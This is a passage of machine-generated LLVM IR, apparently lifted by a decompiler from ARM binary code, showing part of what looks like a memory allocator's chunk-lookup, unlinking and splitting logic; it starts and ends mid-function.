  %v0_140b8 = phi i32 [ %v1_14078, %dec_label_pc_1409c ], [ 16, %.thread ], [ %v1_14078, %.thread43 ]
  store i32 1, i32* %r2.global-to-local, align 4
  %v1_13cfc = sub nsw i32 32, %v1_13d10
  store i32 %v1_13cfc, i32* %r1.global-to-local, align 4
  %v7_13d04 = lshr i32 1, %v1_13cfc
  store i32 %v7_13d04, i32* %r4.global-to-local, align 4
  %v1_13d08 = add nsw i32 %v1_13d10, -32
  store i32 %v1_13d08, i32* %r0.global-to-local, align 4
  %v6_13d08 = icmp slt i32 %v1_13d10, 32
  br i1 %v6_13d08, label %bb64, label %bb

bb:                                               ; preds = %dec_label_pc_13cf8
  %v7_13d0c = shl i32 1, %v1_13d08
  store i32 %v7_13d0c, i32* %r4.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_13cf8, %bb
  %v0_13d18 = phi i32 [ %v7_13d04, %dec_label_pc_13cf8 ], [ %v7_13d0c, %bb ]
  %v1_13d14 = shl i32 -1, %v1_13d10
  %v6_13d18 = sub i32 -1, %v0_13d18
  store i32 ptrtoint (i32* @global_var_22408.562 to i32), i32* @sl, align 4
  store i32 ptrtoint (i8** @global_var_22b2c.529 to i32), i32* @fp, align 4
  %v2_13d2c70 = load i32, i32* @global_var_22408.562, align 4
  %v5_13d2c71 = load i32, i32* @global_var_2240c.564, align 4
  store i32 %v5_13d2c71, i32* @r4, align 4
  %v2_13d3872 = and i32 %v2_13d2c70, %v1_13d14
  store i32 %v2_13d3872, i32* %r1.global-to-local, align 4
  %v2_13d3c73 = and i32 %v5_13d2c71, %v6_13d18
  store i32 %v2_13d3c73, i32* %r2.global-to-local, align 4
  %v2_13d4074 = or i32 %v2_13d3c73, %v2_13d3872
  store i32 %v2_13d4074, i32* %r3.global-to-local, align 4
  %v4_13d4076 = icmp eq i32 %v2_13d4074, 0
  br i1 %v4_13d4076, label %dec_label_pc_13e74, label %dec_label_pc_13d48.preheader

dec_label_pc_13d2c.loopexit:                      ; preds = %dec_label_pc_13df8, %dec_label_pc_13e10, %dec_label_pc_13e30
  %v2_13d2c = load i32, i32* @global_var_22408.562, align 4
  %v5_13d2c = load i32, i32* @global_var_2240c.564, align 4
  store i32 %v5_13d2c, i32* @r4, align 4
  %v2_13d38 = and i32 %v2_13d2c, %v1_13d14
  store i32 %v2_13d38, i32* %r1.global-to-local, align 4
  %v2_13d3c = and i32 %v5_13d2c, %v6_13d18
  store i32 %v2_13d3c, i32* %r2.global-to-local, align 4
  %v2_13d40 = or i32 %v2_13d3c, %v2_13d38
  store i32 %v2_13d40, i32* %r3.global-to-local, align 4
  %v4_13d40 = icmp eq i32 %v2_13d40, 0
  br i1 %v4_13d40, label %dec_label_pc_13e74, label %dec_label_pc_13d48.preheader

dec_label_pc_13d48.preheader:                     ; preds = %bb64, %dec_label_pc_13d2c.loopexit
  %v2_13d3c78 = phi i32 [ %v2_13d3c, %dec_label_pc_13d2c.loopexit ], [ %v2_13d3c73, %bb64 ]
  %v2_13d3877 = phi i32 [ %v2_13d38, %dec_label_pc_13d2c.loopexit ], [ %v2_13d3872, %bb64 ]
  br label %dec_label_pc_13d48

dec_label_pc_13d48:                               ; preds = %dec_label_pc_13d48.preheader, %dec_label_pc_13e4c
  %v0_13d50 = phi i32 [ %v2_13e68, %dec_label_pc_13e4c ], [ %v2_13d3c78, %dec_label_pc_13d48.preheader ]
  %v0_13fc8 = phi i32 [ %v2_13e64, %dec_label_pc_13e4c ], [ %v2_13d3877, %dec_label_pc_13d48.preheader ]
  store i32 %v0_13fc8, i32* %r3.global-to-local, align 4
  %v2_13d48 = icmp eq i32 %v0_13fc8, 0
  br i1 %v2_13d48, label %dec_label_pc_13d50, label %dec_label_pc_13fc8

dec_label_pc_13d50:                               ; preds = %dec_label_pc_13d48
  %v1_13d50 = sub i32 0, %v0_13d50
  %v2_13d54 = and i32 %v0_13d50, %v1_13d50
  store i32 %v2_13d54, i32* %r0.global-to-local, align 4
  %v3_13d64 = mul i32 %v2_13d54, 1088
  store i32 %v3_13d64, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19fd2.578 to i32), i32* %r2.global-to-local, align 4
  %v2_13d98 = mul i32 %v2_13d54, 124511785
  store i32 %v2_13d98, i32* %r3.global-to-local, align 4
  %v4_13d9c = udiv i32 %v2_13d98, 134217728
  %v5_13d9c = add i32 %v4_13d9c, ptrtoint (i32* @global_var_19fd2.578 to i32)
  %v6_13d9c = inttoptr i32 %v5_13d9c to i8*
  %v7_13d9c = load i8, i8* %v6_13d9c, align 1
  %v9_13d9c = zext i8 %v7_13d9c to i32
  store i32 %v9_13d9c, i32* %r1.global-to-local, align 4
  %v1_13da0 = add nuw nsw i32 %v9_13d9c, 32
  br label %dec_label_pc_13da4

dec_label_pc_13da4:                               ; preds = %dec_label_pc_13fc8, %dec_label_pc_13d50
  %storemerge = phi i32 [ %v1_13da0, %dec_label_pc_13d50 ], [ %v9_14014, %dec_label_pc_13fc8 ]
  store i32 %storemerge, i32* @r8, align 4
  %v3_13da4 = load i32, i32* @global_var_22b38.560, align 4
  store i32 %v3_13da4, i32* %r2.global-to-local, align 4
  %v3_13da8 = mul nsw i32 %storemerge, 16
  store i32 %v3_13da8, i32* @r6, align 4
  %v1_13dac = or i32 %v3_13da8, 8
  store i32 %v1_13dac, i32* %r3.global-to-local, align 4
  %v2_13db0 = icmp eq i32 %v3_13da4, 0
  store i1 %v2_13db0, i1* @cpsr_z, align 1
  %v1_13db4 = load i32, i32* @sl, align 4
  %v2_13db4 = add i32 %v1_13db4, %v1_13dac
  store i32 %v2_13db4, i32* @r5, align 4
  br i1 %v2_13db0, label %dec_label_pc_13dbc, label %dec_label_pc_13fa0

dec_label_pc_13dbc.loopexit:                      ; preds = %dec_label_pc_13fc4
  %v0_13dbc.pre = load i32, i32* @r8, align 4
  %v0_13dc0.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_13dbc

dec_label_pc_13dbc:                               ; preds = %dec_label_pc_13dbc.loopexit, %dec_label_pc_13da4
  %v0_13dc0 = phi i32 [ %v0_13dc0.pre, %dec_label_pc_13dbc.loopexit ], [ %v1_13db4, %dec_label_pc_13da4 ]
  %v0_140e4 = phi i32 [ %v0_13dbc.pre, %dec_label_pc_13dbc.loopexit ], [ %storemerge, %dec_label_pc_13da4 ]
  %v1_13dbc = add i32 %v0_140e4, 1
  store i32 %v1_13dbc, i32* %r1.global-to-local, align 4
  %v4_13dc0 = mul i32 %v1_13dbc, 16
  %v5_13dc0 = add i32 %v4_13dc0, %v0_13dc0
  %v6_13dc0 = inttoptr i32 %v5_13dc0 to i32*
  %v7_13dc0 = load i32, i32* %v6_13dc0, align 4
  store i32 %v7_13dc0, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_22408.562 to i32), i32* @r0, align 4
  %v2_13dc8 = icmp eq i32 %v7_13dc0, 0
  br i1 %v2_13dc8, label %.thread7, label %dec_label_pc_13de4

.thread7:                                         ; preds = %dec_label_pc_13dbc
  %v4_13dcc = mul i32 %v1_13dbc, 16
  %v3_13dd0 = add i32 %v4_13dcc, ptrtoint (i32* @global_var_22408.562 to i32)
  store i32 %v3_13dd0, i32* %r3.global-to-local, align 4
  %v2_13dd4 = add i32 %v4_13dcc, add (i32 ptrtoint (i32* @global_var_22408.562 to i32), i32 -8)
  store i32 %v2_13dd4, i32* %r2.global-to-local, align 4
  %v7_13dd8 = add i32 %v4_13dc0, ptrtoint (i32* @global_var_22408.562 to i32)
  %v8_13dd8 = inttoptr i32 %v7_13dd8 to i32*
  store i32 %v2_13dd4, i32* %v8_13dd8, align 4
  %v1_13ddc = load i32, i32* %r2.global-to-local, align 4
  %v2_13ddc = load i32, i32* %r3.global-to-local, align 4
  %v3_13ddc = add i32 %v2_13ddc, 4
  %v4_13ddc = inttoptr i32 %v3_13ddc to i32*
  store i32 %v1_13ddc, i32* %v4_13ddc, align 4
  %v1_13dfc.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_13df8

dec_label_pc_13de4:                               ; preds = %dec_label_pc_13dbc
  %v1_13dec = add i32 %v4_13dc0, add (i32 ptrtoint (i32* @global_var_22408.562 to i32), i32 -8)
  store i32 %v1_13dec, i32* %r3.global-to-local, align 4
  %v9_13df0 = icmp eq i32 %v7_13dc0, %v1_13dec
  br i1 %v9_13df0, label %dec_label_pc_13df8, label %dec_label_pc_140e4

dec_label_pc_13df8:                               ; preds = %.thread7, %dec_label_pc_13de4
  %v1_13dfc = phi i32 [ %v1_13dfc.pre, %.thread7 ], [ %v0_13dc0, %dec_label_pc_13de4 ]
  %v0_13df8 = load i32, i32* @r6, align 4
  %v1_13df8 = add i32 %v0_13df8, 8
  store i32 %v1_13df8, i32* %r2.global-to-local, align 4
  %v2_13dfc = add i32 %v1_13dfc, %v1_13df8
  %v3_13dfc = inttoptr i32 %v2_13dfc to i32*
  %v4_13dfc = load i32, i32* %v3_13dfc, align 4
  store i32 %v4_13dfc, i32* %r3.global-to-local, align 4
  %v2_13e00 = icmp eq i32 %v4_13dfc, 0
  store i1 %v2_13e00, i1* @cpsr_z, align 1
  store i32 ptrtoint (i32* @global_var_22408.562 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_13dfc, i32* %r4.global-to-local, align 4
  br i1 %v2_13e00, label %dec_label_pc_13d2c.loopexit, label %dec_label_pc_13e10

dec_label_pc_13e10:                               ; preds = %dec_label_pc_13df8
  %v0_13e10 = call i32 @function_15ce4()
  store i32 %v0_13e10, i32* @r0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_13e18 = load i32, i32* %r2.global-to-local, align 4
  %v2_13e18 = load i32, i32* %r1.global-to-local, align 4
  %v3_13e18 = add i32 %v2_13e18, %v1_13e18
  %v4_13e18 = inttoptr i32 %v3_13e18 to i32*
  store i32 0, i32* %v4_13e18, align 4
  %v0_13e1c = call i32 @function_15ce4()
  store i32 %v0_13e1c, i32* %r0.global-to-local, align 4
  %v0_13e20 = load i32, i32* @r6, align 4
  %v1_13e20 = add i32 %v0_13e20, 12
  store i32 %v1_13e20, i32* %r3.global-to-local, align 4
  %v1_13e24 = load i32, i32* %r1.global-to-local, align 4
  %v2_13e24 = add i32 %v1_13e24, %v1_13e20
  %v3_13e24 = inttoptr i32 %v2_13e24 to i32*
  %v4_13e24 = load i32, i32* %v3_13e24, align 4
  store i32 %v4_13e24, i32* %r2.global-to-local, align 4
  %v2_13e28 = icmp eq i32 %v4_13e24, 0
  br i1 %v2_13e28, label %dec_label_pc_13d2c.loopexit, label %dec_label_pc_13e30

dec_label_pc_13e30:                               ; preds = %dec_label_pc_13e10
  store i32 240, i32* @r7, align 4
  %v0_13e34 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13e34, i32* %r0.global-to-local, align 4
  store i32 129, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_13e48 = icmp eq i32 %v0_13e34, -38
  br i1 %v4_13e48, label %dec_label_pc_13e4c, label %dec_label_pc_13d2c.loopexit

dec_label_pc_13e4c:                               ; preds = %dec_label_pc_13e30
  store i32 -38, i32* %r0.global-to-local, align 4
  %v2_13e58 = load i32, i32* @global_var_22408.562, align 4
  %v5_13e58 = load i32, i32* @global_var_2240c.564, align 4
  store i32 %v5_13e58, i32* @r4, align 4
  %v2_13e64 = and i32 %v2_13e58, %v1_13d14
  store i32 %v2_13e64, i32* %r1.global-to-local, align 4
  %v2_13e68 = and i32 %v5_13e58, %v6_13d18
  store i32 %v2_13e68, i32* %r2.global-to-local, align 4
  %v2_13e6c = or i32 %v2_13e68, %v2_13e64
  store i32 %v2_13e6c, i32* %r3.global-to-local, align 4
  %v4_13e6c = icmp eq i32 %v2_13e6c, 0
  br i1 %v4_13e6c, label %dec_label_pc_13e74, label %dec_label_pc_13d48

dec_label_pc_13e74:                               ; preds = %bb64, %dec_label_pc_13d2c.loopexit, %dec_label_pc_13e4c
  %v3_13e74 = load i32, i32* @global_var_22b38.560, align 4
  store i32 %v3_13e74, i32* %r3.global-to-local, align 4
  store i32 %v0_140b8, i32* %ip.global-to-local, align 4
  %v2_13e7c = icmp eq i32 %v3_13e74, 0
  store i1 %v2_13e7c, i1* @cpsr_z, align 1
  %v1_13e80 = add i32 %v0_140b8, 16
  store i32 %v1_13e80, i32* %r2.global-to-local, align 4
  store i32 %v1_13e80, i32* %stack_var_-44, align 4
  store i32 ptrtoint (i32* @global_var_223fc.580 to i32), i32* @r6, align 4
  br i1 %v2_13e7c, label %dec_label_pc_13e90, label %dec_label_pc_14038

dec_label_pc_13e90:                               ; preds = %dec_label_pc_1401c, %dec_label_pc_13e74
  %v2_13e90 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_13e90, i32* %r0.global-to-local, align 4
  %v2_13e94 = call i32 @function_16b90(i32* nonnull %stack_var_-44)
  store i32 %v2_13e94, i32* @r0, align 4
  store i32 %v2_13e94, i32* %r4.global-to-local, align 4
  %v2_13e98 = icmp eq i32 %v2_13e94, 0
  br i1 %v2_13e98, label %dec_label_pc_14228, label %dec_label_pc_13ea0

dec_label_pc_13ea0:                               ; preds = %dec_label_pc_13e90
  store i32 ptrtoint (i32* @global_var_223f8.582 to i32), i32* @r0, align 4
  %v2_13ea4 = load i32, i32* @global_var_223f8.582, align 4
  store i32 %v2_13ea4, i32* %r3.global-to-local, align 4
  %v9_13ea8 = icmp eq i32 %v2_13e94, %v2_13ea4
  br i1 %v9_13ea8, label %dec_label_pc_13ec8, label %dec_label_pc_13eb0

dec_label_pc_13eb0:                               ; preds = %dec_label_pc_13ea0
  %v3_13eb0 = load i32, i32* %stack_var_-44, align 4
  %v1_13eb4 = add i32 %v2_13e94, 16
  store i32 %v1_13eb4, i32* %r4.global-to-local, align 4
  %v1_13eb8 = add i32 %v3_13eb0, -16
  store i32 %v1_13eb8, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 %v1_13eb8, i32* %stack_var_-44, align 4
  %v2_13ec4 = add i32 %v2_13e94, 8
  %v3_13ec4 = inttoptr i32 %v2_13ec4 to i32*
  store i32 1, i32* %v3_13ec4, align 4
  %v0_13ecc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13ec8

dec_label_pc_13ec8:                               ; preds = %dec_label_pc_13ea0, %dec_label_pc_13eb0
  %v0_13ecc = phi i32 [ %v2_13e94, %dec_label_pc_13ea0 ], [ %v0_13ecc.pre, %dec_label_pc_13eb0 ]
  %v3_13ec8 = load i32, i32* %stack_var_-44, align 4
  %v1_13ecc = add i32 %v0_13ecc, -8
  store i32 %v1_13ecc, i32* @r5, align 4
  %v1_13ed0 = or i32 %v3_13ec8, 1
  store i32 %v1_13ed0, i32* %r1.global-to-local, align 4
  %v2_13ed4 = add i32 %v3_13ec8, %v0_13ecc
  store i32 %v2_13ed4, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r4, align 4
  %v1_13edc = add i32 %v2_13ed4, -8
  %v2_13edc = inttoptr i32 %v1_13edc to i32*
  store i32 %v1_13ed0, i32* %v2_13edc, align 4
  %v4_13edc = add i32 %v2_13ed4, -4
  %v5_13edc = inttoptr i32 %v4_13edc to i32*
  %v6_13edc = load i32, i32* @r4, align 4
  store i32 %v6_13edc, i32* %v5_13edc, align 4
  %v0_13ee0 = load i32, i32* %r1.global-to-local, align 4
  %v1_13ee0 = load i32, i32* @r5, align 4
  %v2_13ee0 = add i32 %v1_13ee0, 4
  %v3_13ee0 = inttoptr i32 %v2_13ee0 to i32*
  store i32 %v0_13ee0, i32* %v3_13ee0, align 4
  %v2_13ee4 = load i32, i32* @global_var_223fc.580, align 4
  store i32 %v2_13ee4, i32* %r2.global-to-local, align 4
  %v2_13ee8 = icmp eq i32 %v2_13ee4, 0
  store i1 %v2_13ee8, i1* @cpsr_z, align 1
  %v0_13eec = load i32, i32* %r3.global-to-local, align 4
  %v1_13eec = load i32, i32* @r0, align 4
  %v2_13eec = inttoptr i32 %v1_13eec to i32*
  store i32 %v0_13eec, i32* %v2_13eec, align 4
  br i1 %v2_13ee8, label %dec_label_pc_13f10, label %dec_label_pc_13ef4

dec_label_pc_13ef4:                               ; preds = %dec_label_pc_13ec8
  %v0_13ef4 = call i32 @function_15ce4()
  store i32 %v0_13ef4, i32* @r0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_13efc = load i32, i32* @r6, align 4
  %v2_13efc = inttoptr i32 %v1_13efc to i32*
  store i32 0, i32* %v2_13efc, align 4
  %v0_13f00 = call i32 @function_15ce4()
  store i32 %v0_13f00, i32* %r0.global-to-local, align 4
  %v3_13f04 = load i32, i32* @global_var_22400.583, align 4
  store i32 %v3_13f04, i32* %r3.global-to-local, align 4
  %v2_13f08 = icmp eq i32 %v3_13f04, 0
  br i1 %v2_13f08, label %dec_label_pc_13f10, label %dec_label_pc_141d8

dec_label_pc_13f10:                               ; preds = %dec_label_pc_13ef4, %dec_label_pc_141d8, %dec_label_pc_13ec8, %dec_label_pc_141f4
  %v0_13f10 = load i32, i32* @r5, align 4
  store i32 %v0_13f10, i32* %r0.global-to-local, align 4
  %v1_13f14 = inttoptr i32 %v0_13f10 to i32*
  %v2_13f14 = call i32 @function_132ac(i32* %v1_13f14)
  store i32 %v2_13f14, i32* %r0.global-to-local, align 4
  %v2_13f18 = icmp eq i32 %v2_13f14, 0
  %v1_13f1c = load i32, i32* @r5, align 4
  br i1 %v2_13f18, label %bb65, label %dec_label_pc_13f24

bb65:                                             ; preds = %dec_label_pc_13f10
  store i32 %v1_13f1c, i32* @r8, align 4
  br label %dec_label_pc_13f54

dec_label_pc_13f24:                               ; preds = %dec_label_pc_13f10
  %v1_13f24 = inttoptr i32 %v1_13f1c to i32*
  %v2_13f24 = load i32, i32* %v1_13f24, align 4
  %v1_13f28 = and i32 %v2_13f24, -2
  %v2_13f2c = sub i32 %v1_13f1c, %v1_13f28
  store i32 %v2_13f2c, i32* %r3.global-to-local, align 4
  %v1_13f30 = add i32 %v2_13f2c, 4
  %v2_13f30 = inttoptr i32 %v1_13f30 to i32*
  %v3_13f30 = load i32, i32* %v2_13f30, align 4
  store i32 %v3_13f30, i32* %r1.global-to-local, align 4
  %v1_13f34 = add i32 %v1_13f1c, 4
  %v2_13f34 = inttoptr i32 %v1_13f34 to i32*
  %v3_13f34 = load i32, i32* %v2_13f34, align 4
  store i32 %v3_13f34, i32* %r2.global-to-local, align 4
  %v1_13f38 = and i32 %v3_13f30, -2
  %v2_13f3c = add i32 %v3_13f34, %v1_13f38
  store i32 %v2_13f3c, i32* %r1.global-to-local, align 4
  store i32 %v2_13f3c, i32* %v2_13f30, align 4
  %v0_13f44 = load i32, i32* %r2.global-to-local, align 4
  %v1_13f44 = and i32 %v0_13f44, -2
  store i32 %v1_13f44, i32* %r2.global-to-local, align 4
  %v0_13f48 = load i32, i32* %r1.global-to-local, align 4
  %v1_13f48 = load i32, i32* @r5, align 4
  %v3_13f48 = add i32 %v1_13f48, %v1_13f44
  %v4_13f48 = inttoptr i32 %v3_13f48 to i32*
  store i32 %v0_13f48, i32* %v4_13f48, align 4
  %v0_13f4c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_13f4c, i32* @r8, align 4
  store i32 %v0_13f4c, i32* @r5, align 4
  br label %dec_label_pc_13f54

dec_label_pc_13f54:                               ; preds = %bb65, %dec_label_pc_141ac, %dec_label_pc_1418c, %dec_label_pc_14174, %dec_label_pc_141c8, %dec_label_pc_13f24
  %v0_13f54 = load i32, i32* @r5, align 4
  %v1_13f54 = add i32 %v0_13f54, 4
  %v2_13f54 = inttoptr i32 %v1_13f54 to i32*
  %v3_13f54 = load i32, i32* %v2_13f54, align 4
  %v1_13f58 = and i32 %v3_13f54, -2
  store i32 %v1_13f58, i32* %r1.global-to-local, align 4
  store i32 %v0_140b8, i32* @r3, align 4
  %v1_13f60 = add i32 %v1_13f58, -16
  store i32 %v1_13f60, i32* %r2.global-to-local, align 4
  %v3_13f64 = icmp ult i32 %v0_140b8, %v1_13f60
  br i1 %v3_13f64, label %dec_label_pc_140b4, label %dec_label_pc_13f6c

dec_label_pc_13f6c:                               ; preds = %dec_label_pc_13f54, %dec_label_pc_140b4
  %v0_13f6c = load i32, i32* @r8, align 4
  %v1_13f6c = add i32 %v0_13f6c, 8
  store i32 %v1_13f6c, i32* @ip, align 4
  br label %dec_label_pc_13f70

dec_label_pc_13f70:                               ; preds = %.thread14, %dec_label_pc_14394, %dec_label_pc_1434c, %dec_label_pc_14234, %dec_label_pc_13f6c
  %v0_13f70 = load i32, i32* @ip, align 4
  store i32 %v0_13f70, i32* %r0.global-to-local, align 4
  store i32 %v3_13cc8, i32* @r4, align 4
  store i32 %v6_13cc8, i32* @r5, align 4
  store i32 %v9_13cc8, i32* @r6, align 4
  store i32 %v12_13cc8, i32* @r7, align 4
  store i32 %v15_13cc8, i32* @r8, align 4
  store i32 %v18_13cc8, i32* @sb, align 4
  store i32 %v21_13cc8, i32* @sl, align 4
  store i32 %v24_13cc8, i32* @fp, align 4
  ret i32 %v0_13f70

dec_label_pc_13f88:                               ; preds = %dec_label_pc_13fc4
  %v0_13f88 = load i32, i32* @r6, align 4
  %v1_13f88 = add i32 %v0_13f88, 12
  store i32 1, i32* @r2, align 4
  %v1_13f90 = load i32, i32* @sl, align 4
  %v2_13f90 = add i32 %v1_13f88, %v1_13f90
  store i32 %v2_13f90, i32* %r1.global-to-local, align 4
  %v0_13f94 = load i32, i32* @r5, align 4
  store i32 %v0_13f94, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v2_13f9c = inttoptr i32 %v0_13f94 to i32*
  %v3_13f9c = call i32 @function_15864(i32* %v2_13f9c, i32 %v2_13f90)
  store i32 %v3_13f9c, i32* %r0.global-to-local, align 4
  %v0_13fa0.pre = load i32, i32* @r6, align 4
  %v1_13fa4.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_13fa0

dec_label_pc_13fa0:                               ; preds = %dec_label_pc_13da4, %dec_label_pc_13f88
  %v1_13fa4 = phi i32 [ %v1_13fa4.pre, %dec_label_pc_13f88 ], [ %v1_13db4, %dec_label_pc_13da4 ]
  %v0_13fa0 = phi i32 [ %v0_13fa0.pre, %dec_label_pc_13f88 ], [ %v3_13da8, %dec_label_pc_13da4 ]
  %v1_13fa0 = add i32 %v0_13fa0, 8
  store i32 %v1_13fa0, i32* %r3.global-to-local, align 4
  %v2_13fa4 = add i32 %v1_13fa0, %v1_13fa4
  store i32 %v2_13fa4, i32* @r4, align 4
  br label %dec_label_pc_13fa8

dec_label_pc_13fa8:                               ; preds = %dec_label_pc_13fa8.dec_label_pc_13fa8_crit_edge, %dec_label_pc_13fa0
  %v0_13fa8 = phi i32 [ %v0_13fa8.pre, %dec_label_pc_13fa8.dec_label_pc_13fa8_crit_edge ], [ %v2_13fa4, %dec_label_pc_13fa0 ]
  %v1_13fa8 = inttoptr i32 %v0_13fa8 to i32*
  %v2_13fa8 = load i32, i32* %v1_13fa8, align 4
  store i32 %v2_13fa8, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_13fa8, i32* %r0.global-to-local, align 4
  store i32 %v0_13fa8, i32* %r2.global-to-local, align 4
  %v4_13fb8 = call i32 @function_15d38(i32 %v2_13fa8, i32 1, i32* %v1_13fa8)
  store i32 %v4_13fb8, i32* %r0.global-to-local, align 4
  %v2_13fbc = icmp eq i32 %v4_13fb8, 0
  store i1 %v2_13fbc, i1* @cpsr_z, align 1
  br i1 %v2_13fbc, label %dec_label_pc_13fc4, label %dec_label_pc_13fa8.dec_label_pc_13fa8_crit_edge

dec_label_pc_13fa8.dec_label_pc_13fa8_crit_edge:  ; preds = %dec_label_pc_13fa8
  %v0_13fa8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13fa8

dec_label_pc_13fc4:                               ; preds = %dec_label_pc_13fa8
  %v0_13f80 = load i32, i32* @r7, align 4
  %v2_13f80 = icmp eq i32 %v0_13f80, 0
  br i1 %v2_13f80, label %dec_label_pc_13dbc.loopexit, label %dec_label_pc_13f88

dec_label_pc_13fc8:                               ; preds = %dec_label_pc_13d48
  %v1_13fc8 = sub i32 0, %v0_13fc8
  %v2_13fcc = and i32 %v0_13fc8, %v1_13fc8
  store i32 %v2_13fcc, i32* %r0.global-to-local, align 4
  %v3_13fdc = mul i32 %v2_13fcc, 1088
  store i32 %v3_13fdc, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19fd2.578 to i32), i32* %r3.global-to-local, align 4
  %v2_14010 = mul i32 %v2_13fcc, 124511785
  store i32 %v2_14010, i32* %r2.global-to-local, align 4
  %v4_14014 = udiv i32 %v2_14010, 134217728
  %v5_14014 = add i32 %v4_14014, ptrtoint (i32* @global_var_19fd2.578 to i32)
  %v6_14014 = inttoptr i32 %v5_14014 to i8*
  %v7_14014 = load i8, i8* %v6_14014, align 1
  %v9_14014 = zext i8 %v7_14014 to i32
  br label %dec_label_pc_13da4

dec_label_pc_1401c:                               ; preds = %dec_label_pc_14054, %dec_label_pc_14038
  store i32 ptrtoint (i32* @global_var_223fc.580 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* @r2, align 4
  %v0_14024 = load i32, i32* @r4, align 4
  %v2_14024 = icmp eq i32 %v0_14024, 0
  store i32 ptrtoint (i32* @global_var_22400.583 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  br i1 %v2_14024, label %dec_label_pc_13e90, label %dec_label_pc_14034

dec_label_pc_14034:                               ; preds = %dec_label_pc_1401c
  %v3_14034 = call i32 @function_15864(i32* nonnull @global_var_223fc.580, i32 ptrtoint (i32* @global_var_22400.583 to i32))
  store i32 %v3_14034, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14038

dec_label_pc_14038:                               ; preds = %dec_label_pc_14054, %dec_label_pc_14034, %dec_label_pc_13e74
  %v2_14038 = load i32, i32* @global_var_223fc.580, align 4
  store i32 %v2_14038, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_223fc.580 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_14038, i32* %r0.global-to-local, align 4
  %v4_14048 = call i32 @function_15d38(i32 %v2_14038, i32 1, i32* nonnull @global_var_223fc.580)
  store i32 %v4_14048, i32* %r0.global-to-local, align 4
  %v2_1404c = icmp eq i32 %v4_14048, 0
  store i1 %v2_1404c, i1* @cpsr_z, align 1
  br i1 %v2_1404c, label %dec_label_pc_1401c, label %dec_label_pc_14054

dec_label_pc_14054:                               ; preds = %dec_label_pc_14038
  %v2_14054 = load i32, i32* @global_var_223fc.580, align 4
  store i32 %v2_14054, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_223fc.580 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_14054, i32* %r0.global-to-local, align 4
  %v4_14064 = call i32 @function_15d38(i32 %v2_14054, i32 1, i32* nonnull @global_var_223fc.580)
  store i32 %v4_14064, i32* %r0.global-to-local, align 4
  %v2_14068 = icmp eq i32 %v4_14064, 0
  store i1 %v2_14068, i1* @cpsr_z, align 1
  br i1 %v2_14068, label %dec_label_pc_1401c, label %dec_label_pc_14038

dec_label_pc_14074:                               ; preds = %dec_label_pc_13cc8
  %v1_14074 = add i32 %v0_13cd4, 23
  %v1_14078 = and i32 %v1_14074, -16
  store i32 %v1_14078, i32* %r3.global-to-local, align 4
  %tmp80 = icmp ugt i32 %v1_14078, 114688
  br i1 %tmp80, label %dec_label_pc_142ec, label %dec_label_pc_14088

dec_label_pc_14088:                               ; preds = %dec_label_pc_14074
  %v3_14088 = udiv i32 %v1_14074, 16
  store i32 %v3_14088, i32* %r3.global-to-local, align 4
  %v1_1408c = add nsw i32 %v3_14088, -1
  store i32 %v1_1408c, i32* @r0, align 4
  %tmp81 = icmp ult i32 %v1_1408c, 33
  br i1 %tmp81, label %.thread43, label %dec_label_pc_1409c

.thread43:                                        ; preds = %dec_label_pc_14088
  store i32 %v1_1408c, i32* @sb, align 4
  br label %dec_label_pc_13cf8

dec_label_pc_1409c:                               ; preds = %dec_label_pc_14088
  %v0_1409c = call i32 @function_175bc()
  %v1_140a4 = add i32 %v0_1409c, 2097151
  %v3_140a8 = udiv i32 %v1_140a4, 2097152
  store i32 %v3_140a8, i32* %r0.global-to-local, align 4
  %v1_140ac = add nsw i32 %v3_140a8, -496
  store i32 %v1_140ac, i32* @sb, align 4
  br label %dec_label_pc_13cf8

dec_label_pc_140b4:                               ; preds = %dec_label_pc_13f54
  store i32 %v0_140b8, i32* %ip.global-to-local, align 4
  %v2_140b8 = sub i32 %v1_13f58, %v0_140b8
  %v1_140bc = or i32 %v2_140b8, 1
  store i32 %v1_140bc, i32* @r3, align 4
  %v1_140c0 = load i32, i32* @r8, align 4
  %v2_140c0 = add i32 %v1_140c0, %v0_140b8
  store i32 %v2_140c0, i32* %r0.global-to-local, align 4
  %v1_140c4 = or i32 %v0_140b8, 1
  store i32 %v1_140c4, i32* @r2, align 4
  %v2_140c8 = add i32 %v2_140c0, 4
  %v3_140c8 = inttoptr i32 %v2_140c8 to i32*
  store i32 %v1_140bc, i32* %v3_140c8, align 4
  %v0_140cc = load i32, i32* @r2, align 4
  %v1_140cc = load i32, i32* %ip.global-to-local, align 4
  %v2_140cc = load i32, i32* @r8, align 4
  %v3_140cc = add i32 %v2_140cc, %v1_140cc
  %v4_140cc = inttoptr i32 %v3_140cc to i32*
  store i32 %v0_140cc, i32* %v4_140cc, align 4
  %v0_140d0 = load i32, i32* @r2, align 4
